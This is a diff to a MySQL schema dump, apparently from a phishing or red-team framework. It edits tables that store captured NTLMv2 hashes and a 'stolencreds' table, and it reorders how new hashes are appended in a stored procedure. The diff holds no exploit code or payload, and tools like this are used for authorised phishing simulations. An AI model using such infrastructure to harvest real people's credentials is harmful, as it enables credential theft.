@@ -231,7 +231,7 @@ CREATE TABLE `requests` (
   `IP` varchar(100) DEFAULT NULL,
   `Target` varchar(100) DEFAULT NULL,
   `Org` varchar(100) DEFAULT NULL,
-  `NTLMv2` varchar(1000) DEFAULT NULL,
+  `NTLMv2` varchar(1000) NOT NULL,
   `UA` varchar(1000) DEFAULT NULL,
   `UUID` varchar(1000) NOT NULL,
   `User` varchar(100) DEFAULT NULL,
@@ -393,13 +393,13 @@ BEGIN
 -- IF A HASH IS CAPTURED, COMPARE THE IP ADDRESS TO AN ACTIVE CAMPAIGN (fakesite or phishingdocs) AND UPDATE THE "requests" TABLE
 UPDATE requests 
 SET 
-    NTLMv2 = CONCAT(NTLMv2, '<br>', InHash)
+    NTLMv2 = CONCAT(NTLMv2, InHash, '<br>')
 WHERE
     IP = InIP;
     
 UPDATE fakesite.stolencreds sc 
 SET 
-    sc.Hash = CONCAT(sc.Hash, '<br>', InHash)
+    sc.Hash = CONCAT(sc.Hash, InHash, '<br>')
 WHERE
     sc.ip = InIP;
 
@@ -458,7 +458,8 @@ CREATE TABLE `stolencreds` (
   `ip` varchar(50) DEFAULT NULL,
   `location` varchar(50) DEFAULT NULL,
   `Token` varchar(1000) DEFAULT NULL,
-  `Hash` varchar(1000) DEFAULT NULL
+  `Hash` varchar(1000) NOT NULL,
+  `stolencredscol` varchar(45) DEFAULT NULL
 ) ENGINE=InnoDB DEFAULT CHARSET=latin1;
 /*!40101 SET character_set_client = @saved_cs_client */;
 
@@ -676,4 +677,4 @@ DELIMITER ;
 /*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
 /*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;
 
--- Dump completed on 2018-11-08 14:49:17
+-- Dump completed on 2018-11-20  9:53:55
